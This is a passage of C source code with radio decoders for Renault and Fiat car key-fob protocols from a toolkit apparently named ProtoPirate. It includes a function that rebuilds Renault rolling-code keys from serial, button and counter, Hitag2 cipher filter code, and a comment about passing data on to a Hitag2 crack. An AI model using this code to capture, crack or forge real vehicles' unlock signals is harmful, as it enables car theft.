    value ^= value >> 8U;
    value ^= value >> 4U;
    value ^= value >> 2U;
    value ^= value >> 1U;
    return (uint8_t)(value & 1U);
}

static void renault_v0_build_key(
    uint32_t serial,
    uint8_t button,
    uint8_t counter,
    uint64_t* out_data,
    uint32_t* out_key2) {
    uint8_t vars[7];
    uint8_t parity_bits[42];

    vars[0] = (button == 0x0AU) ? 1U : 0U;
    for(uint8_t bit = 0; bit < 6U; bit++) {
        vars[bit + 1U] = (counter >> bit) & 1U;
    }

    uint32_t mask_low = 1U;
    uint32_t mask_high = 0U;
    uint8_t mask_bit = 1U;

    for(uint8_t i = 0; i < 7U; i++, mask_bit++) {
        if(vars[i]) {
            renault_v0_set_split_bit(&mask_low, &mask_high, mask_bit);
        }
    }

    for(uint8_t i = 0; i < 6U; i++) {
        for(uint8_t j = i + 1U; j < 7U; j++, mask_bit++) {
            if(vars[i] & vars[j]) {
                renault_v0_set_split_bit(&mask_low, &mask_high, mask_bit);
            }
        }
    }

    for(uint8_t i = 0; i < 6U; i++) {
        for(uint8_t j = i + 1U; j < 7U; j++) {
            for(uint8_t k = j + 1U; k < 7U; k++, mask_bit++) {
                if(vars[i] & vars[j] & vars[k]) {
                    renault_v0_set_split_bit(&mask_low, &mask_high, mask_bit);
                }
            }
        }
    }

    for(size_t row = 0; row < COUNT_OF(renault_v0_matrix); row++) {
        const uint32_t mixed = (renault_v0_matrix[row].low & mask_low) ^
                               (renault_v0_matrix[row].high & mask_high);
        parity_bits[row] = renault_v0_parity32(mixed);
    }

    if(counter & 0x40U) {
        parity_bits[41] ^= 1U;
    }
    if((counter >> 7U) != 0U) {
        parity_bits[40] ^= 1U;
    }

    uint32_t data_low = ((uint32_t)counter) << 24U;
    uint32_t data_high = (serial << 8U) | (uint32_t)button;

    for(uint8_t i = 0; i < 24U; i++) {
        if(parity_bits[i]) {
            data_low |= 1UL << (23U - i);
        }
    }

    uint32_t key2 = 0U;
    for(uint8_t i = 24U; i < 42U; i++) {
        if(parity_bits[i]) {
            key2 |= 1UL << (41U - i);
        }
    }

    if(out_data) {
        *out_data = ((uint64_t)data_high << 32U) | data_low;
    }
    if(out_key2) {
        *out_key2 = key2;
    }
}

static bool renault_v0_model_matches(
    uint64_t data,
    uint32_t key2,
    uint32_t serial,
    uint8_t button,
    uint8_t counter) {
    uint64_t rebuilt_data = 0ULL;
    uint32_t rebuilt_key2 = 0U;
    renault_v0_build_key(serial, button, counter, &rebuilt_data, &rebuilt_key2);
    return (rebuilt_data == data) && (rebuilt_key2 == key2);
}

static void
    renault_v0_update_checks(uint64_t data, uint32_t key2, uint8_t* c1, uint8_t* c2, uint8_t* ic) {
    uint32_t serial = 0U;
    uint8_t button = 0U;
    uint8_t counter = 0U;
    renault_v0_parse_fields(data, &serial, &button, &counter);

    const uint8_t checksum = renault_v0_checksum(data, key2);
    if(c1) {
        *c1 = ((checksum & 0x3FU) == 0x13U) ? 0U : 1U;
    }
    if(c2) {
        *c2 = (((key2 & 0x03U) == (uint32_t)(checksum >> 6U))) ? 0U : 1U;
    }
    if(ic) {
        *ic = renault_v0_model_matches(data, key2, serial, button, counter) ? 0U : 1U;
    }
}

static bool renault_v0_type13_valid(uint64_t data, uint32_t key2) {
    uint8_t button = (uint8_t)(data >> 32U);
    const uint8_t checksum = renault_v0_checksum(data, key2);
    if((checksum & 0x3FU) != 0x13U) {
        return false;
    }
    if((key2 & 0x03U) != (uint32_t)(checksum >> 6U)) {
        return false;
    }
    return renault_v0_button_valid(button);
}

static bool renault_v0_classify_event(uint32_t duration, bool level, uint8_t* event_code) {
    if(duration <= (RENAULT_V0_TE_SHORT_US - 1U)) {
        if((RENAULT_V0_TE_SHORT_US - duration) > RENAULT_V0_TE_DELTA_US) {
            return false;
        }
        *event_code = (uint8_t)(((level ? 1U : 0U) ^ 1U) << 1U);
        return true;
    }

    if(duration <= (RENAULT_V0_TE_LONG_US - 1U)) {
        const uint32_t short_delta = duration - RENAULT_V0_TE_SHORT_US;
        const uint32_t long_inv_delta = RENAULT_V0_TE_LONG_US - duration;
        if(short_delta <= RENAULT_V0_TE_DELTA_US) {
            if(long_inv_delta > RENAULT_V0_TE_DELTA_US) {
                *event_code = (uint8_t)(((level ? 1U : 0U) ^ 1U) << 1U);
            } else {
                *event_code = level ? 4U : 6U;
            }
            return true;
        }
        if(long_inv_delta <= RENAULT_V0_TE_DELTA_US) {
            *event_code = level ? 4U : 6U;
            return true;
        }
        return false;
    }

    if((duration - RENAULT_V0_TE_LONG_US) > RENAULT_V0_TE_DELTA_US) {
        return false;
    }
    *event_code = level ? 4U : 6U;
    return true;
}

static void renault_v0_decode_candidate(PpDec_renault_v0* instance) {
    const uint8_t bit_count = instance->decoded_bit_count;
    if(bit_count <= 0x51U) {
        return;
    }

    uint8_t preamble = 0U;
    while((preamble < bit_count) && (instance->decoded_bits[preamble] == 1U)) {
        preamble++;
    }
    if(preamble <= 9U) {
        return;
    }
    if((uint8_t)(bit_count - preamble) <= 0x51U) {
        return;
    }

    uint64_t data = 0ULL;
    for(uint8_t i = 0; i < 64U; i++) {
        data = (data << 1U) | (uint64_t)(instance->decoded_bits[preamble + i] & 1U);
    }

    uint32_t key2 = 0U;
    for(uint8_t i = 0; i < 18U; i++) {
        key2 = (key2 << 1U) | (uint32_t)(instance->decoded_bits[preamble + 64U + i] & 1U);
    }

    if(!renault_v0_type13_valid(data, key2)) {
        instance->packet_bit_count = 0U;
        instance->generic.data_count_bit = 0U;
        return;
    }

    uint32_t serial = 0U;
    uint8_t button = 0U;
    uint8_t counter = 0U;
    renault_v0_parse_fields(data, &serial, &button, &counter);

    instance->generic.data = data;
    instance->decoder.decode_data = data;
    instance->decoder.decode_count_bit = RENAULT_V0_MIN_BITS;
    instance->packet_bit_count = RENAULT_V0_MIN_BITS;
    instance->generic.data_count_bit = RENAULT_V0_MIN_BITS;
    instance->key2 = key2;
    instance->generic.serial = serial;
    instance->generic.btn = button;
    instance->generic.cnt = counter;
    renault_v0_update_checks(
        data, key2, &instance->check_c1, &instance->check_c2, &instance->check_ic);
    if(instance->base.callback) {
        instance->base.callback(&instance->base, instance->base.context);
    }
}

// (6) alloc
static void* renault_v0_alloc() {
    PpDec_renault_v0* i = (PpDec_renault_v0*)calloc(1, sizeof(PpDec_renault_v0));
    if(!i) return NULL;
    i->generic.protocol_name = "Renault V0";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

// (7) reset
static void renault_v0_reset(void* context) {
    PpDec_renault_v0* instance = (PpDec_renault_v0*)context;
    instance->decoder.parser_step = RenaultV0DecoderStepReset;
    instance->manchester_state = 1U;
    instance->decoded_bit_count = 0U;
    instance->key2 = 0U;
}

// (8) feed
static void renault_v0_feed(void* context, bool level, uint32_t duration) {
    PpDec_renault_v0* instance = (PpDec_renault_v0*)context;
    uint8_t event_code = 0U;

    if(instance->decoder.parser_step == RenaultV0DecoderStepReset) {
        if(level && (duration >= RENAULT_V0_SYNC_MIN_US)) {
            instance->decoder.parser_step = RenaultV0DecoderStepData;
            instance->decoded_bit_count = 0U;
            instance->manchester_state = 1U;
        }
        return;
    }

    if(instance->decoded_bit_count > RENAULT_V0_DECODER_BIT_LIMIT) {
        renault_v0_decode_candidate(instance);
        instance->decoder.parser_step = RenaultV0DecoderStepReset;
        return;
    }

    if(!renault_v0_classify_event(duration, level, &event_code)) {
        renault_v0_decode_candidate(instance);
        if(level && (duration >= RENAULT_V0_SYNC_MIN_US)) {
            instance->decoder.parser_step = RenaultV0DecoderStepData;
            instance->decoded_bit_count = 0U;
            instance->manchester_state = 1U;
        } else {
            instance->decoder.parser_step = RenaultV0DecoderStepReset;
        }
        return;
    }

    const uint8_t state = instance->manchester_state & 0x03U;
    uint8_t next_state = (renault_v0_decoder_state_table[state] >> event_code) & 0x03U;
    if(next_state == state) {
        return;
    }

    instance->manchester_state = next_state;
    if((next_state == 1U) || (next_state == 2U)) {
        const uint8_t bit = (next_state == 1U) ? 1U : 0U;
        const uint8_t bit_offset = instance->decoded_bit_count;
        instance->decoded_bit_count = bit_offset + 1U;
        instance->decoded_bits[bit_offset] = bit;
    }
}

// ============================================================================
//  Renault V1 (Hitag2)  --  ProtoPirate (GPLv3)
// ============================================================================

// (2) #defines used by feed/reset (uniquely prefixed)
#define RENAULT_V1_TE_US             125U
#define RENAULT_V1_MIN_COUNT_BIT     88U
#define RENAULT_V1_HEADER_BITS       16U
#define RENAULT_V1_KEY_BITS          64U
#define RENAULT_V1_KEY2_BITS         24U
#define RENAULT_V1_KEY_END_BITS      (RENAULT_V1_HEADER_BITS + RENAULT_V1_KEY_BITS)
#define RENAULT_V1_LONG_FRAME_BITS   (RENAULT_V1_KEY_END_BITS + RENAULT_V1_KEY2_BITS)
#define RENAULT_V1_HEADER_LOW_MIN_US  1150U
#define RENAULT_V1_HEADER_LOW_MAX_US  2200U
#define RENAULT_V1_HEADER_HIGH_MIN_US 800U
#define RENAULT_V1_HEADER_HIGH_MAX_US 1150U
#define RENAULT_V1_DATA_IGNORE_US     49U
#define RENAULT_V1_DATA_RESET_US      520U
#define RENAULT_V1_TE_HIGH_INIT_US    120U
#define RENAULT_V1_TE_LOW_INIT_US     150U

// (1) block const
static const SubGhzBlockConst renault_v1_const = {
    .te_short = RENAULT_V1_TE_US,
    .te_long = RENAULT_V1_TE_US * 2U,
    .te_delta = 50,
    .min_count_bit_for_found = RENAULT_V1_MIN_COUNT_BIT,
};

// (4) decoder step enum
typedef enum {
    RenaultV1DecoderStepReset = 0,
    RenaultV1DecoderStepCheckSync = 2,
    RenaultV1DecoderStepData = 3,
} RenaultV1DecoderStep;

// (3) decoder instance (EXTRA fields verbatim from source struct)
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    ManchesterState manchester_state;
    uint16_t te_high;
    uint16_t te_low;
    uint16_t header;
    uint8_t recovered;
    uint8_t hitag2_key[6];
    uint32_t hop;
    uint8_t tail_bits;
    bool hitag2_key_valid;
    uint64_t last_data;
    uint64_t last_data_2;
    bool last_frame_valid;
    uint32_t seed;
    uint64_t data_2;
} PpDec_renault_v1;

// (5) static helpers reached by the feed path (generic hitag2_* renamed with prefix)
static void renault_v1_u64_to_bytes_be(uint64_t value, uint8_t* out, size_t nbytes) {
    for(size_t i = 0; i < nbytes; i++) {
        out[i] = (uint8_t)(value >> (8U * (nbytes - 1U - i)));
    }
}

static void renault_v1_pack_key_bytes(uint64_t key, uint64_t key_2, uint8_t raw[11]) {
    renault_v1_u64_to_bytes_be(key, raw, 8);
    raw[8] = (uint8_t)(key_2 >> 16U);
    raw[9] = (uint8_t)(key_2 >> 8U);
    raw[10] = (uint8_t)key_2;
}

static uint8_t renault_v1_frame_xor(const uint8_t raw[11]) {
    uint8_t value = 0;
    for(size_t i = 0; i < 10; i++) {
        value ^= raw[i];
    }
    return value;
}

static uint16_t renault_v1_frame_cnt10(const uint8_t raw[11]) {
    return (uint16_t)(((uint16_t)(raw[4] & 0x0FU) << 6U) | (raw[5] >> 2U));
}

static uint32_t renault_v1_frame_hop(const uint8_t raw[11]) {
    return ((uint32_t)(raw[5] & 3U) << 30U) | ((uint32_t)raw[6] << 22U) |
           ((uint32_t)raw[7] << 14U) | ((uint32_t)raw[8] << 6U) | (raw[9] >> 2U);
}

static uint8_t renault_v1_frame_tail(const uint8_t raw[11]) {
    return (uint8_t)(raw[9] & 3U);
}

static void renault_v1_unpack_frame(
    uint64_t data,
    uint64_t data_2,
    uint32_t* serial,
    uint8_t* btn,
    uint16_t* cnt10,
    uint32_t* hop,
    uint8_t* tail) {
    uint8_t raw[11];
    renault_v1_pack_key_bytes(data, data_2, raw);
    if(serial) {
        *serial = (uint32_t)(data >> 32U);
    }
    if(btn) {
        *btn = (uint8_t)((raw[4] >> 4U) & 0x0FU);
    }
    if(cnt10) {
        *cnt10 = renault_v1_frame_cnt10(raw);
    }
    if(hop) {
        *hop = renault_v1_frame_hop(raw);
    }
    if(tail) {
        *tail = renault_v1_frame_tail(raw);
    }
}

static bool renault_v1_duration_is_header_low(uint32_t duration) {
    return (duration >= RENAULT_V1_HEADER_LOW_MIN_US) && (duration <= RENAULT_V1_HEADER_LOW_MAX_US);
}

static uint32_t renault_v1_data_threshold(uint16_t te) {
    const uint32_t triple = (uint32_t)te * 3U;
    if(triple < 300U) {
        return 150U;
    }
    if(triple >= 422U) {
        return 210U;
    }
    return triple / 2U;
}

static uint16_t renault_v1_adapt_te(uint16_t te, uint32_t duration) {
    const uint32_t mixed = ((uint32_t)te * 7U) + duration;
    if(mixed < 560U) {
        return 70;
    }
    if(mixed >= 1488U) {
        return 185;
    }
    return (uint16_t)(mixed / 8U);
}

static bool renault_v1_accept_frame(PpDec_renault_v1* instance, uint64_t key_2) {
    if(instance->header != 1U) {
        return false;
    }

    uint8_t raw[11];
    renault_v1_pack_key_bytes(instance->generic.data, key_2, raw);
    if(renault_v1_frame_xor(raw) != raw[10]) {
        return false;
    }

    if(instance->last_frame_valid && instance->last_data == instance->generic.data &&
       instance->last_data_2 == key_2) {
        return false;
    }

    instance->data_2 = key_2;
    instance->generic.data_2 = key_2;   // 24-bit key_2 -> propagé via pp_cb pour le crack HITAG2
    instance->generic.data_count_bit = RENAULT_V1_MIN_COUNT_BIT;
    instance->recovered = 0;
    instance->seed = 0;
    uint16_t cnt10 = 0;
    renault_v1_unpack_frame(
        instance->generic.data,
        instance->data_2,
        &instance->generic.serial,
        &instance->generic.btn,
        &cnt10,
        &instance->hop,
        &instance->tail_bits);
    instance->generic.cnt = cnt10;
    instance->last_data = instance->generic.data;
    instance->last_data_2 = key_2;
    instance->last_frame_valid = true;
    return true;
}

// (6) alloc
static void* renault_v1_alloc() {
    PpDec_renault_v1* i = (PpDec_renault_v1*)calloc(1, sizeof(PpDec_renault_v1));
    if(!i) return NULL;
    i->generic.protocol_name = "Renault V1";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

// (7) reset
static void renault_v1_reset(void* context) {
    PpDec_renault_v1* instance = (PpDec_renault_v1*)context;
    instance->decoder.parser_step = RenaultV1DecoderStepReset;
    manchester_advance(
        instance->manchester_state, ManchesterEventReset, &instance->manchester_state, NULL);
}

// (8) feed
static void renault_v1_feed(void* context, bool level, uint32_t duration) {
    PpDec_renault_v1* instance = (PpDec_renault_v1*)context;

    while(true) {
        switch(instance->decoder.parser_step) {
        case RenaultV1DecoderStepReset:
            if((!level) && renault_v1_duration_is_header_low(duration)) {
                instance->decoder.te_last = duration;
                instance->decoder.parser_step = RenaultV1DecoderStepCheckSync;
            }
            return;

        case RenaultV1DecoderStepCheckSync:
            if(level) {
                if((duration < RENAULT_V1_HEADER_HIGH_MIN_US) ||
                   (duration > RENAULT_V1_HEADER_HIGH_MAX_US) ||
                   (instance->decoder.te_last < RENAULT_V1_HEADER_LOW_MIN_US) ||
                   (instance->decoder.te_last > RENAULT_V1_HEADER_LOW_MAX_US)) {
                    instance->decoder.parser_step = RenaultV1DecoderStepReset;
                    return;
                }
                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                instance->manchester_state = ManchesterStateStart1;
                instance->te_high = RENAULT_V1_TE_HIGH_INIT_US;
                instance->te_low = RENAULT_V1_TE_LOW_INIT_US;
                instance->decoder.parser_step = RenaultV1DecoderStepData;
                return;
            }
            instance->decoder.parser_step = RenaultV1DecoderStepReset;
            if(renault_v1_duration_is_header_low(duration)) {
                instance->decoder.te_last = duration;
                instance->decoder.parser_step = RenaultV1DecoderStepCheckSync;
            }
            return;

        case RenaultV1DecoderStepData: {
            if(duration <= RENAULT_V1_DATA_IGNORE_US) {
                return;
            }
            if(duration > RENAULT_V1_DATA_RESET_US) {
                instance->decoder.parser_step = RenaultV1DecoderStepReset;
                continue;
            }

            uint16_t* te = level ? &instance->te_high : &instance->te_low;
            ManchesterEvent event;
            if(duration > renault_v1_data_threshold(*te)) {
                event = level ? ManchesterEventLongHigh : ManchesterEventLongLow;
            } else {
                event = level ? ManchesterEventShortHigh : ManchesterEventShortLow;
                *te = renault_v1_adapt_te(*te, duration);
            }

            bool bit = false;
            if(!manchester_advance(
                   instance->manchester_state, event, &instance->manchester_state, &bit)) {
                return;
            }

            instance->decoder.decode_data = (instance->decoder.decode_data << 1U) |
                                            (bit ? 1ULL : 0ULL);
            instance->decoder.decode_count_bit++;

            if(instance->decoder.decode_count_bit == RENAULT_V1_HEADER_BITS) {
                instance->header = (uint16_t)~instance->decoder.decode_data;
                instance->decoder.decode_data = 0;
                return;
            }
            if(instance->decoder.decode_count_bit == RENAULT_V1_KEY_END_BITS) {
                instance->generic.data = ~instance->decoder.decode_data;
                instance->decoder.decode_data = 0;
                return;
            }
            if(instance->decoder.decode_count_bit == RENAULT_V1_LONG_FRAME_BITS) {
                const uint64_t key_2 = (~instance->decoder.decode_data) & 0xFFFFFFULL;
                if(renault_v1_accept_frame(instance, key_2) && instance->base.callback) {
                    instance->base.callback(&instance->base, instance->base.context);
                }
                instance->decoder.decode_data = 0;
                instance->decoder.decode_count_bit = 0;
                instance->decoder.parser_step = RenaultV1DecoderStepData;
            }
            return;
        }

        default:
            instance->decoder.parser_step = RenaultV1DecoderStepReset;
            return;
        }
    }
}

// ============================================================================
//  Fiat V0  --  ProtoPirate (GPLv3)
// ============================================================================

// (2) #defines used by the feed path (uniquely prefixed already)
#define FIAT_V0_PREAMBLE_PAIRS 150
#define FIAT_V0_GAP_US         800

// (1) block const
static const SubGhzBlockConst fiat_v0_const = {
    .te_short = 200,
    .te_long = 400,
    .te_delta = 100,
    .min_count_bit_for_found = 64,
};

// (4) decoder step enum
typedef enum {
    FiatV0DecoderStepReset = 0,
    FiatV0DecoderStepPreamble = 1,
    FiatV0DecoderStepData = 2,
} FiatV0DecoderStep;

// (3) decoder instance
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    ManchesterState manchester_state;
    uint16_t preamble_count;
    uint32_t data_low;
    uint32_t data_high;
    uint8_t bit_count;
    uint32_t hop;
    uint32_t fix;
    uint8_t endbyte;
} PpDec_fiat_v0;

// (5) static helper reached by the feed path
static void fiat_v0_finish_packet(PpDec_fiat_v0* instance) {
    instance->generic.data = ((uint64_t)instance->hop << 32) | instance->fix;
    instance->generic.data_count_bit = 71;
    instance->generic.serial = instance->fix;
    instance->generic.btn = instance->endbyte;
    instance->generic.cnt = instance->hop;
    instance->decoder.decode_data = instance->generic.data;
    instance->decoder.decode_count_bit = instance->generic.data_count_bit;
    if(instance->base.callback) instance->base.callback(&instance->base, instance->base.context);
    instance->data_low = 0;
    instance->data_high = 0;
    instance->bit_count = 0;
    instance->decoder.parser_step = FiatV0DecoderStepReset;
}

// (6) alloc
static void* fiat_v0_alloc() {
    PpDec_fiat_v0* i = (PpDec_fiat_v0*)calloc(1, sizeof(PpDec_fiat_v0));
    if(!i) return NULL;
    i->generic.protocol_name = "Fiat V0";
    i->base.callback = pp_cb;
    i->base.context = &i->generic;
    return i;
}

// (7) reset
static void fiat_v0_reset(void* context) {
    PpDec_fiat_v0* instance = (PpDec_fiat_v0*)context;
    instance->decoder.parser_step = FiatV0DecoderStepReset;
    instance->decoder.decode_data = 0;
    instance->decoder.decode_count_bit = 0;
    instance->preamble_count = 0;
    instance->data_low = 0;
    instance->data_high = 0;
    instance->bit_count = 0;
    instance->hop = 0;
    instance->fix = 0;
    instance->endbyte = 0;
    instance->manchester_state = ManchesterStateMid1;
}

// (8) feed
static void fiat_v0_feed(void* context, bool level, uint32_t duration) {
    PpDec_fiat_v0* instance = (PpDec_fiat_v0*)context;

    uint32_t te_short = (uint32_t)fiat_v0_const.te_short;
    uint32_t te_long = (uint32_t)fiat_v0_const.te_long;
    uint32_t te_delta = (uint32_t)fiat_v0_const.te_delta;
    uint32_t gap_threshold = FIAT_V0_GAP_US;
    uint32_t diff;

    switch(instance->decoder.parser_step) {
    case FiatV0DecoderStepReset:
        if(!level) return;
        if(duration < te_short) {
            diff = te_short - duration;
        } else {
            diff = duration - te_short;
        }
        if(diff < te_delta) {
            instance->data_low = 0;
            instance->data_high = 0;
            instance->decoder.parser_step = FiatV0DecoderStepPreamble;
            instance->preamble_count = 0;
            instance->bit_count = 0;
            instance->decoder.decode_data = 0;
            instance->decoder.decode_count_bit = 0;
            manchester_advance(
                instance->manchester_state,
                ManchesterEventReset,
                &instance->manchester_state,
                NULL);
        }
        break;

    case FiatV0DecoderStepPreamble:
        if(level) {
            if(duration < te_short) {
                diff = te_short - duration;
            } else {
                diff = duration - te_short;
            }
            if(diff < te_delta) {
                instance->preamble_count++;
            } else {
                instance->decoder.parser_step = FiatV0DecoderStepReset;
            }
            return;
        }

        if(duration < te_short) {
            diff = te_short - duration;
        } else {
            diff = duration - te_short;
        }

        if(diff < te_delta) {
            instance->preamble_count++;
        } else {
            if(instance->preamble_count >= FIAT_V0_PREAMBLE_PAIRS) {
                if(duration < gap_threshold) {
                    diff = gap_threshold - duration;
                } else {
                    diff = duration - gap_threshold;
                }
                if(diff < te_delta) {
                    instance->decoder.parser_step = FiatV0DecoderStepData;
                    instance->preamble_count = 0;
                    instance->data_low = 0;
                    instance->data_high = 0;
                    instance->bit_count = 0;
                    manchester_advance(
                        instance->manchester_state,
                        ManchesterEventReset,
                        &instance->manchester_state,
                        NULL);
                    return;
                }
            }
            instance->decoder.parser_step = FiatV0DecoderStepReset;
        }

        if(instance->preamble_count >= FIAT_V0_PREAMBLE_PAIRS &&
           instance->decoder.parser_step == FiatV0DecoderStepPreamble) {
            if(duration < gap_threshold) {
                diff = gap_threshold - duration;
            } else {
                diff = duration - gap_threshold;
            }
            if(diff < te_delta) {
                instance->decoder.parser_step = FiatV0DecoderStepData;
                instance->preamble_count = 0;
                instance->data_low = 0;
                instance->data_high = 0;
                instance->bit_count = 0;
                manchester_advance(
                    instance->manchester_state,
                    ManchesterEventReset,
                    &instance->manchester_state,
                    NULL);
                return;
            }
        }
        break;

    case FiatV0DecoderStepData: {
        ManchesterEvent event = ManchesterEventReset;
        if(duration < te_short) {
            diff = te_short - duration;
            if(diff < te_delta) {
                event = level ? ManchesterEventShortLow : ManchesterEventShortHigh;
            }
        } else {
            diff = duration - te_short;
            if(diff < te_delta) {
                event = level ? ManchesterEventShortLow : ManchesterEventShortHigh;
            } else {
                if(duration < te_long) {
                    diff = te_long - duration;
                } else {
                    diff = duration - te_long;
                }
                if(diff < te_delta) {
                    event = level ? ManchesterEventLongLow : ManchesterEventLongHigh;
                }
            }
        }

        if(event != ManchesterEventReset) {
            bool data_bit_bool;
            if(manchester_advance(
                   instance->manchester_state,
                   event,
                   &instance->manchester_state,
                   &data_bit_bool)) {
                uint32_t new_bit = data_bit_bool ? 1 : 0;
                uint32_t carry = (instance->data_low >> 31) & 1;
                instance->data_low = (instance->data_low << 1) | new_bit;
                instance->data_high = (instance->data_high << 1) | carry;
                instance->bit_count++;

                if(instance->bit_count == 64) {
                    instance->fix = instance->data_low;
                    instance->hop = instance->data_high;
                    instance->data_low = 0;
                    instance->data_high = 0;
                }
                if(instance->bit_count == 0x47) {
                    instance->endbyte = (uint8_t)(instance->data_low & 0x3F);
                    fiat_v0_finish_packet(instance);
                }
            }
        } else {
            if(instance->bit_count == 0x47) {
                instance->endbyte = (uint8_t)(instance->data_low & 0x3F);
                fiat_v0_finish_packet(instance);
            } else if(instance->bit_count < 64) {
                instance->decoder.parser_step = FiatV0DecoderStepReset;
            }
        }
        break;
    }
    default:
        break;
    }
}

// ============================================================================
//  Fiat V1 (BCM / Hitag2)  --  ProtoPirate (GPLv3)
// ============================================================================

// (2) #defines used by the decode path (uniquely prefixed already)
#define FIAT_V1_TE_SHORT           250U
#define FIAT_V1_TE_LONG            500U
#define FIAT_V1_TE_DELTA           100U
#define FIAT_V1_TE_B_SHORT         100U
#define FIAT_V1_TE_B_LONG          200U
#define FIAT_V1_TE_B_DELTA         50U
#define FIAT_V1_WIRE_BITS          104U
#define FIAT_V1_WIRE_BYTES         13U
#define FIAT_V1_WIRE_CELLS         (FIAT_V1_WIRE_BITS * 2U)
#define FIAT_V1_LOGICAL_BITS       102U
#define FIAT_V1_VARIANT_COUNT      2U
#define FIAT_V1_BOUNDARY_MIN_US    800U
#define FIAT_V1_DEFAULT_TAIL_BITS  2U
#define FIAT_V1_KNOWN_KEY_COUNT    9U
#define FIAT_V1_TE_VARIANT_A       0U
#define FIAT_V1_TE_VARIANT_B       1U
#define FIAT_V1_DEFAULT_TE_VARIANT FIAT_V1_TE_VARIANT_B

// (1) block consts (two timing variants)
static const SubGhzBlockConst subghz_protocol_fiat_v1_const = {
    .te_short = FIAT_V1_TE_SHORT,
    .te_long = FIAT_V1_TE_LONG,
    .te_delta = FIAT_V1_TE_DELTA,
    .min_count_bit_for_found = FIAT_V1_LOGICAL_BITS,
};

static const SubGhzBlockConst subghz_protocol_fiat_v1_const_b = {
    .te_short = FIAT_V1_TE_B_SHORT,
    .te_long = FIAT_V1_TE_B_LONG,
    .te_delta = FIAT_V1_TE_B_DELTA,
    .min_count_bit_for_found = FIAT_V1_LOGICAL_BITS,
};

// (4) decoder step enum
typedef enum {
    FiatV1DecoderStepReset = 0,
    FiatV1DecoderStepData = 1,
} FiatV1DecoderStep;

// (3) decoder instance (EXTRA fields verbatim from source struct)
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;

    uint8_t cells[FIAT_V1_VARIANT_COUNT][FIAT_V1_WIRE_CELLS];
    uint16_t cell_count[FIAT_V1_VARIANT_COUNT];

    uint8_t raw_data[FIAT_V1_WIRE_BYTES];
    uint8_t last_raw_data[FIAT_V1_WIRE_BYTES];
    bool last_raw_valid;

    uint32_t uid;
    uint32_t hop;
    uint8_t family;
    uint8_t tail_bits;
    uint8_t frame_xor;

    uint8_t hitag2_key[6];
    uint32_t hitag2_epoch;
    bool hitag2_key_valid;
    uint8_t te_variant;
} PpDec_fiat_v1;

// (5) static helpers reached by the decode path
static const SubGhzBlockConst* fiat_v1_variant_const(uint8_t variant) {
    return (variant == FIAT_V1_TE_VARIANT_A) ? &subghz_protocol_fiat_v1_const :
                                               &subghz_protocol_fiat_v1_const_b;
}

static bool fiat_v1_duration_is_short(uint8_t variant, uint32_t duration) {
    return pp_is_short(duration, fiat_v1_variant_const(variant));
}

static bool fiat_v1_duration_is_long(uint8_t variant, uint32_t duration) {
    return pp_is_long(duration, fiat_v1_variant_const(variant));
}

static bool fiat_v1_duration_is_pulse(uint32_t duration) {
    for(uint8_t variant = 0U; variant < FIAT_V1_VARIANT_COUNT; variant++) {
        if(fiat_v1_duration_is_short(variant, duration) ||
           fiat_v1_duration_is_long(variant, duration)) {
            return true;
        }
    }
    return false;
}

static bool fiat_v1_button_valid(uint8_t button) {
    return button == 0x1U || button == 0x2U || button == 0x4U || button == 0x8U;
}

static uint8_t fiat_v1_frame_xor(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    uint8_t value = 0x01U;
    for(uint8_t i = 0U; i < FIAT_V1_WIRE_BYTES - 1U; i++) {
        value ^= raw[i];
    }
    return value;
}

static uint32_t fiat_v1_uid(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    return ((uint32_t)raw[2] << 24U) | ((uint32_t)raw[3] << 16U) | ((uint32_t)raw[4] << 8U) |
           raw[5];
}

static uint32_t fiat_v1_counter(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    return ((uint32_t)(raw[6] & 0x0FU) << 6U) | (raw[7] >> 2U);
}

static uint32_t fiat_v1_hop(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    return ((uint32_t)(raw[7] & 0x03U) << 30U) | ((uint32_t)raw[8] << 22U) |
           ((uint32_t)raw[9] << 14U) | ((uint32_t)raw[10] << 6U) | (raw[11] >> 2U);
}

static bool fiat_v1_frame_valid(const uint8_t raw[FIAT_V1_WIRE_BYTES]) {
    if(raw[0] != 0x00U || raw[1] != 0x01U) {
        return false;
    }
    if(fiat_v1_frame_xor(raw) != raw[12]) {
        return false;
    }
    if(!fiat_v1_button_valid(raw[6] >> 4U)) {
        return false;
    }

    const uint32_t uid = fiat_v1_uid(raw);
    return uid != 0U && uid != UINT32_MAX;
}

// BCM / Hitag2-style authenticator (in-file static helpers)
static uint8_t fiat_v1_truth(uint32_t table, uint8_t index) {
    return (uint8_t)((table >> index) & 1U);
}

static uint8_t fiat_v1_filter_index(uint8_t a, uint8_t b, uint8_t c, uint8_t d) {
    return (uint8_t)((a << 3U) | (b << 2U) | (c << 1U) | d);
}

static uint8_t fiat_v1_byte_bit(uint8_t byte, uint8_t bit) {
    return (uint8_t)((byte >> bit) & 1U);
}

static uint8_t fiat_v1_bcm_hitag2_filter(const uint8_t state[6]) {
    uint8_t group = 0U;
    group |= fiat_v1_truth(
        0x2c79U,
        fiat_v1_filter_index(
            fiat_v1_byte_bit(state[0], 1U),
            fiat_v1_byte_bit(state[0], 2U),
            fiat_v1_byte_bit(state[0], 4U),
            fiat_v1_byte_bit(state[0], 5U)));
    group |= (uint8_t)(fiat_v1_truth(
                           0x6671U,
                           fiat_v1_filter_index(
                               fiat_v1_byte_bit(state[1], 0U),
                               fiat_v1_byte_bit(state[1], 1U),
                               fiat_v1_byte_bit(state[1], 3U),
                               fiat_v1_byte_bit(state[1], 7U)))
                       << 1U);
    group |= (uint8_t)(fiat_v1_truth(
                           0x6671U,
                           fiat_v1_filter_index(
                               fiat_v1_byte_bit(state[3], 5U),
                               fiat_v1_byte_bit(state[2], 0U),
                               fiat_v1_byte_bit(state[2], 2U),
                               fiat_v1_byte_bit(state[2], 6U)))
                       << 2U);
